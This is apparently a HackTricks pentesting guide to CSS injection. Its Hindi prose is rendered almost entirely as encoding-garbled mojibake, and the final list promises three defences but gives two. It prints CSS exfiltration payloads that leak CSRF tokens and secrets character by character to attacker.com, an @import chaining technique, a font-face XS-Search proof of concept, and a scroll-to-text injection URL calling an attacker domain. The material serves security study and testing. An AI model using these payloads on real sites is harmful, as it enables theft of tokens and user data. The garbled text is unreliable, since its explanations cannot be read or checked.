# CSS рдЗрдВрдЬреЗрдХреНрд╢рди

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рдЕрдирдиреНрдп [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

## CSS рдЗрдВрдЬреЗрдХреНрд╢рди

### рд╡рд┐рд╢реЗрд╖рддрд╛ рдЪрдпрдирдХрд░реНрддрд╛

CSS рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХрд╛ рдореБрдЦреНрдп рддрдХрдиреАрдХ рд╣реИ рдХрд┐ **CSS рдХреЗ рд╕рд╛рде рдПрдХ рдкрд╛рда рдХреЛ рдорд┐рд▓рд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ** рдФрд░ рдпрджрд┐ **рдкрд╛рда рдореМрдЬреВрдж рд╣реИ** рддреЛ **рдХреБрдЫ рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдХрд░реЗрдВ, рдЬреИрд╕реЗ:**
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
рдпрд╣рд╛рдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рддрдХрдиреАрдХ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧреА рдЕрдЧрд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рдЕрдиреБрд╕рд╛рд░ **csrf рдирд╛рдо рдЗрдирдкреБрдЯ** **рдЫрд┐рдкрд╛ рд╣реБрдЖ рдкреНрд░рдХрд╛рд░** рдХрд╛ рд╣реИ (рдФрд░ рдЖрдорддреМрд░ рдкрд░ рдРрд╕рд╛ рд╣реА рд╣реЛрддрд╛ рд╣реИ), рдХреНрдпреЛрдВрдХрд┐ рдкреГрд╖реНрдарднреВрдорд┐ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧреАред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдЗрд╕ рдмрд╛рдзрд╛ рдХреЛ **рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдХрд░** рдЗрд╕реЗ рдЙрдореНрдореАрдж рд╕реЗ рднреА рдмрдврд╝рдХрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рдХреЗ рдмрдЬрд╛рдп рдХрд┐ рдЫрд┐рдкрд╛ рд╣реБрдЖ рддрддреНрд╡ рдкреГрд╖реНрдарднреВрдорд┐ рд▓реЛрдб рдХрд░рд╛рдПрдВ, **рдмрд╕ рдЙрд╕рдХреЗ рдмрд╛рдж рдХреБрдЫ рднреА рдкреГрд╖реНрдарднреВрдорд┐ рд▓реЛрдб рдХрд░рд╛рдПрдВ:**
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
рдХреБрдЫ рдХреЛрдб рдЙрджрд╛рд╣рд░рдг рдЗрд╕реЗ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП: [https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e)

#### рдкреВрд░реНрд╡рд╛рдкреЗрдХреНрд╖рд╛рдПрдВ

1. CSS рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛ рдкрд░реНрдпрд╛рдкреНрдд рд▓рдВрдмреЗ рдкреЗрд▓реЛрдб рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреА рдЪрд╛рд╣рд┐рдП
2. **рдкреЗрдЬ рдХреЛ рдлреНрд░реЗрдо рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рддрд╛рдХрд┐ рдирд╡реАрдирддрдо рдЙрддреНрдкрдиреНрди рдкреЗрд▓реЛрдб рдХреЗ CSS рдкреБрдирд░реНрдореВрд▓реНрдпрд╛рдВрдХрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**
3. **рдмрд╛рд╣рд░реА рд╣реЛрд╕реНрдЯ рдХреА рдЧрдИ рдЫрд╡рд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛** (CSP рджреНрд╡рд╛рд░рд╛ рдЕрд╡рд░реБрджреНрдз рд╣реЛ рд╕рдХрддрд╛ рд╣реИ)

### рдЕрдВрдзрд╛ рдЧреБрдгрдзрд░реНрдо рдЪрдпрдирдХрд░реНрддрд╛

[**рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**](https://portswigger.net/research/blind-css-exfiltration), рдХрд┐ рдЕрдВрдзреЗ рддрддреНрд╡реЛрдВ рд╕реЗ рднреА рд╕рд╛рдордЧреНрд░реА рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрдпрдирдХрд░реНрддрд╛рдУрдВ **`:has`** рдФрд░ **`:not`** рдХреЛ рдорд┐рд▓рд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЖрдкрдХреЛ рдкрддрд╛ рдирд╣реАрдВ рд╣реЛрддрд╛ рдХрд┐ CSS рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╡реЗрдм рдкреЗрдЬ рдореЗрдВ рдХреНрдпрд╛ рд╣реИред\
рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк рдЙрди рдЪрдпрдирдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╣реА рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдИ рдмреНрд▓реЙрдХ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд **@import** рддрдХрдиреАрдХ рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдХрд░, рдмреНрд▓рд╛рдЗрдВрдб рдкреЗрдЬ рд╕реЗ CSS рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╣реБрдд рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рдореЗрдВ рдХреБрдЫ рдХрдорд┐рдпрд╛рдВ рд╣реИрдВ, рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдПрдВ рдЬрд╛рдВрдЪреЗрдВред рдЖрдкрдХреЛ рдпрд╛ рддреЛ **рдкреАрдбрд╝рд┐рдд рдХреЛ рдмрд╣реБрдд рд╕рд╛рд░реЗ рд▓рд┐рдВрдХ рднреЗрдЬрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП**, рдпрд╛ рдЖрдкрдХреЛ **CSS рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд╡рдВрд╢рдЬ рдкреЗрдЬ рдХреЛ рдЖрдИрдлреНрд░реЗрдо рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рдФрд░ рдЪрддреБрд░ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ рддрдХрдиреАрдХ рдХреА рдЧреБрдгрд╡рддреНрддрд╛ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП **CSS `@import`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИред

рдпрд╣ рдкрд╣рд▓реА рдмрд╛рд░ [**рдкреЗрдкреЗ рд╡рд┐рд▓рд╛**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) рджреНрд╡рд╛рд░рд╛ рджрд┐рдЦрд╛рдИ рдЧрдИ рдереА рдФрд░ рдпрд╣ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛рдо рдХрд░рддреА рд╣реИ:

рдмрдЬрд╛рдп рдПрдХ рд╣реА рдкреЗрдЬ рдХреЛ рдмрд╛рд░-рдмрд╛рд░ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╛рд░-рдмрд╛рд░ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдХреЗ рд╕рд╛рде рдЕрд▓рдЧ-рдЕрд▓рдЧ рдкреЗрд▓реЛрдб рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реЛрддреА рд╣реИ (рдкрд┐рдЫрд▓реЗ рддрдХрдиреАрдХ рдореЗрдВ), рд╣рдо **рдкреЗрдЬ рдХреЛ рдХреЗрд╡рд▓ рдПрдХ рдмрд╛рд░ рдФрд░ рдХреЗрд╡рд▓ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдПрдХ рдЖрдпрд╛рдд рдХрд░рдХреЗ рд▓реЛрдб рдХрд░реЗрдВрдЧреЗ** (рдпрд╣ рдкреАрдбрд╝рд┐рдд рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдкреЗрд▓реЛрдб рд╣реИ):
```css
@import url('//attacker.com:5001/start?');
```
1. рдЖрдХреНрд░рдордХреЛрдВ рд╕реЗ рдХреБрдЫ CSS рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ рдФрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрд╕реЗ рд▓реЛрдб рдХрд░реЗрдЧрд╛ред
2. рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЧрдП CSS рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдкрд╣рд▓рд╛ рд╣рд┐рд╕реНрд╕рд╛ рдлрд┐рд░ рд╕реЗ рдПрдХ рдФрд░ `@import` рд╣реЛрдЧрд╛ред
1. рд╣рдорд▓рд╛рд╡рд░ рдХреА рд╕рд░реНрд╡рд░ рдЕрднреА рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ рдХрд░реЗрдЧреА, рдХреНрдпреЛрдВрдХрд┐ рд╣рдореЗрдВ рдХреБрдЫ рд╡рд░реНрдг рдЫрд┐рдкрд╛рдиреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЗрд╕ рдЖрдпрд╛рдд рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдЙрдЪрд┐рдд рдХрд░рдирд╛ рд╣реИред
3. рдкреЗрд▓реЛрдб рдХрд╛ рджреВрд╕рд░рд╛ рдФрд░ рдмрдбрд╝рд╛ рд╣рд┐рд╕реНрд╕рд╛ рдПрдХ **рдЧреБрдгрдХ рдЪрдпрдирдХрд░реНрддрд╛ рд░рд┐рд╕рд╛рд╡ рдкреЗрд▓реЛрдб** рд╣реЛрдЧрд╛ред
1. рдЗрд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреА рд╕рд░реНрд╡рд░ рдХреЛ рдЧреБрдкреНрдд рдХреЗ рдкрд╣рд▓реЗ рдФрд░ рдЕрдВрддрд┐рдо рд╡рд░реНрдг рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред
4. рдЬреИрд╕реЗ рд╣реА рд╣рдорд▓рд╛рд╡рд░ рдХреА рд╕рд░реНрд╡рд░ рдиреЗ **рдЧреБрдкреНрдд рдХреЗ рдкрд╣рд▓реЗ рдФрд░ рдЕрдВрддрд┐рдо рд╡рд░реНрдг** рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рд╣реИрдВ, рд╡рд╣ **2 рдЪрд░рдг рдореЗрдВ рдЕрдиреБрд░реЛрдзрд┐рдд рдЖрдпрд╛рдд рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрдЧреА**ред
1. рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ **2, 3 рдФрд░ 4 рдЪрд░рдг** рдХреЗ рддрд░рд╣ рд╣реЛрдЧреА, рд▓реЗрдХрд┐рди рдЗрд╕ рдмрд╛рд░ рдпрд╣ **рдЧреБрдкреНрдд рдХреЗ рджреВрд╕рд░реЗ рд╡рд░реНрдг рдХреЛ рдЦреЛрдЬрдиреЗ рдФрд░ рдлрд┐рд░ рд╕реЗ рджреВрд╕рд░реЗ рд╕реЗ рдЫрдареЗ рд╡рд░реНрдг рдХреЛ рдЦреЛрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧреА**ред

рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЧреБрдкреНрдд рдХрд░рдиреЗ рддрдХ рдЗрд╕ рд▓реВрдк рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдЧрд╛ред

рдЖрдк рдпрд╣рд╛рдВ рдореВрд▓ [**Pepe Vila рдХреЛрдб рдпрд╣рд╛рдВ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) рдпрд╛ рдЖрдк рд▓рдЧрднрдЧ [**рд╡рд╣реА рдХреЛрдб рдпрд╣рд╛рдВ рдЯрд┐рдкреНрдкрдгреА рдХреЗ рд╕рд╛рде рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ**](./#css-injection)

{% hint style="info" %}
рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреНрд░рддреНрдпреЗрдХ рдмрд╛рд░ 2 рд╡рд░реНрдг рдЦреЛрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ (рд╢реБрд░реБрдЖрдд рдФрд░ рдЕрдВрдд рд╕реЗ) рдХреНрдпреЛрдВрдХрд┐ рдЧреБрдгрдХ рдЪрдпрдирдХрд░реНрддрд╛ рдХреЛ рдЗрд╕ рддрд░рд╣ рдХреА рдЪреАрдЬреЗрдВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рддреЗрдЬреА рд╕реЗ рд▓реАрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
{% endhint %}

{% hint style="warning" %}
рдХрднреА-рдХрднреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ **рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдкрддрд╛ рдирд╣реАрдВ рд▓рдЧрд╛ рдкрд╛рддрд╛ рд╣реИ рдХрд┐ рдЦреЛрдЬреЗ рдЧрдП рдкреНрд░реАрдлрд┐рдХреНрд╕ + рд╕рдлрд╝рд┐рдХреНрд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкреВрд░реНрдг рдзреНрд╡рдЬ рд╣реИрдВ** рдФрд░ рдпрд╣ рдЖрдЧреЗ рдмрдврд╝рддрд╛ рд░рд╣реЗрдЧрд╛ (рдкреНрд░реАрдлрд┐рдХреНрд╕ рдореЗрдВ) рдФрд░ рдкреАрдЫреЗ рдЬрд╛рдПрдЧрд╛ (рд╕рдлрд╝рд┐рдХреНрд╕ рдореЗрдВ) рдФрд░ рдХрд╣реАрдВ рди рдХрд╣реАрдВ рдпрд╣ рдЕрдЯрдХ рдЬрд╛рдПрдЧрд╛ред\
рдЪрд┐рдВрддрд╛ рди рдХрд░реЗрдВ, рдмрд╕ **рдЖрдЙрдЯрдкреБрдЯ** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рд╡рд╣рд╛рдВ рдзреНрд╡рдЬ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

### рдЕрдиреНрдп рд╕реЗрд▓реЗрдХреНрдЯрд░

**CSS рд╕реЗрд▓реЗрдХреНрдЯрд░** рдХреЗ рд╕рд╛рде DOM рднрд╛рдЧреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* **`.class-to-search:nth-child(2)`**: рдпрд╣ DOM рдореЗрдВ "class-to-search" рд╡рд╛рд▓реЗ рджреВрд╕рд░реЗ рдЖрдЗрдЯрдо рдХреА рдЦреЛрдЬ рдХрд░реЗрдЧрд╛ред
*   **`:empty`** рд╕реЗрд▓реЗрдХреНрдЯрд░: рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [**рдЗрд╕ рд╡реНрд░рд╛рдЗрдЯрдЕрдк**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)** рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд XS-Search

**рд╕рдВрджрд░реНрдн:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

рдореВрд▓ рд╡рд┐рдЪрд╛рд░ рдпрд╣ рд╣реИ рдХрд┐ **рд╣рдорд╛рд░реЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдПрдХ рдЕрдВрддрдмрд┐рдВрджреБ рд╕реЗ рдПрдХ рдХрд╕реНрдЯрдо рдлрд╝реЙрдиреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ** рдЬреЛ **рдХреЗрд╡рд▓ рддрднреА рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬрдм рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛** рд╣реИред
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://ourenpoint.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
### рд╕реНрдЯрд╛рдЗрд▓рд┐рдВрдЧ рд╕реНрдХреНрд░реЙрд▓-рдЯреВ-рдЯреЗрдХреНрд╕реНрдЯ рдлрд╝реНрд░реИрдЧрдореЗрдВрдЯ

рдЬрдм рдПрдХ **URL рдлрд╝реНрд░реИрдЧрдореЗрдВрдЯ рдХрд┐рд╕реА рддрддреНрд╡ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ**, рддреЛ [**`:target`**](https://drafts.csswg.org/selectors-4/#the-target-pseudo) рдкреНрд╕реЗрдбреЛ-рдХреНрд▓рд╛рд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рдЪреБрдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди **`::target-text` рдХрд┐рд╕реА рднреА рдЪреАрдЬрд╝ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛**ред рдпрд╣ рдХреЗрд╡рд▓ рдЙрд╕ рдкрд╛рда рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ \[рдлрд╝реНрд░реИрдЧрдореЗрдВрдЯ] рд▓рдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╕реНрдХреНрд░реЙрд▓-рдЯреВ-рдЯреЗрдХреНрд╕реНрдЯ рдлрд╝реНрд░реИрдЧрдореЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдпрджрд┐ рдЙрд╕ рдкрд╛рда рдХреЗ рд╕рд╛рде рдХреБрдЫ рдорд┐рд▓рддрд╛ рд╣реИ рддреЛ рд╣рдо рдЙрд╕реЗ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рд╕реЗ рдПрдХ рд╕рдВрд╕рд╛рдзрди (HTML рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```css
:target::before { content : url(target.png) }
```
рдЗрд╕ рд╣рдорд▓реЗ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдпрд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

{% code overflow="wrap" %}
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
{% endcode %}

рдЬреЛ рдПрдХ **HTML рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛрдб рднреЗрдЬрдХрд░ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ**:

{% code overflow="wrap" %}
```css
<style>:target::before { content : url(http://attackers-domain/?confirmed_existence_of_Administrator_username) }</style>
```
{% endcode %}

рд╕реНрдХреНрд░реЙрд▓-рдЯреВ-рдЯреЗрдХреНрд╕реНрдЯ рдлреНрд░реИрдЧрдореЗрдВрдЯ рдХреЗ рд╕рд╛рде: **`#:~:text=рдкреНрд░рд╢рд╛рд╕рдХ`**

рдпрджрд┐ рдкреНрд░рд╢рд╛рд╕рдХ рд╢рдмреНрдж рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕рдВрдХреЗрддрд┐рдд рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

рддреАрди рдореБрдЦреНрдп рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рд╣реИрдВ:

1. **STTF рдХреЗрд╡рд▓ рд╡реЗрдм рдкреГрд╖реНрда рдкрд░ рд╢рдмреНрдж рдпрд╛ рд╡рд╛рдХреНрдпреЛрдВ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ**, рд╕рд┐рджреНрдзрд╛рдВрддрд╛рддреНрдордХ рд░реВрдк рд╕реЗ рдЗрд╕реЗ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд░рд╣рд╕реНрдп рдпрд╛ рдЯреЛрдХрди рд▓реАрдХ рдХрд░рдирд╛ рдЕрд╕рдВрднрд╡ рдмрдирд╛рддрд╛ рд╣реИ (рдЬрдм рддрдХ рд╣рдо рд░рд╣рд╕реНрдп рдХреЛ рдПрдХ рдЕрдХреНрд╖рд░ рдХреЗ рдкреИрд░рд╛рдЧреНрд░рд╛рдл рдореЗрдВ рди рддреЛрдбрд╝ рджреЗрдВ)ред
2. рдпрд╣ **рд╢реАрд░реНрд╖-рд╕реНрддрд░реАрдп рдмреНрд░рд╛рдЙрдЬрд╝рд┐рдВрдЧ рд╕рдВрджрд░реНрднреЛрдВ рдкрд░ рд╕реАрдорд┐рдд рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдПрдХ iframe рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛ **рдкреАрдбрд╝рд┐рдд рдХреЛ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛**ред
